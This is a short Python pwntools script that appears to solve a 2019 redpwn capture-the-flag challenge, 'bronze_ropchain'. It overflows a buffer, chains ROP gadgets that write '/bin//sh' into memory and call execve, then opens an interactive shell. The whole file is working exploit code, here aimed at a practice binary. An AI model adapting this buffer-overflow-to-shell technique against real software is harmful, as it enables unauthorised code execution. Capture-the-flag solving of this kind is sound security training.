from pwn import *

pop_eax_edx_ebx = 0x080564b4
pop_ecx_ebx = 0x0806ef52
interrupt = 0x080495b3
movd_eax_edx = 0x0809d084

sh  = 0x080d8010
bss = 0x080d8080

r = process('./bronze_ropchain')
#r = remote('chall.2019.redpwn.net', 4004)

payload = 'a'*0x1c + flat(pop_eax_edx_ebx, sh, '/bin', bss, movd_eax_edx, pop_eax_edx_ebx, sh+4, '//sh', bss, movd_eax_edx, pop_ecx_ebx, bss, bss, pop_eax_edx_ebx, 0xb, bss, sh, interrupt)

r.sendlineafter('?', payload)

r.interactive()
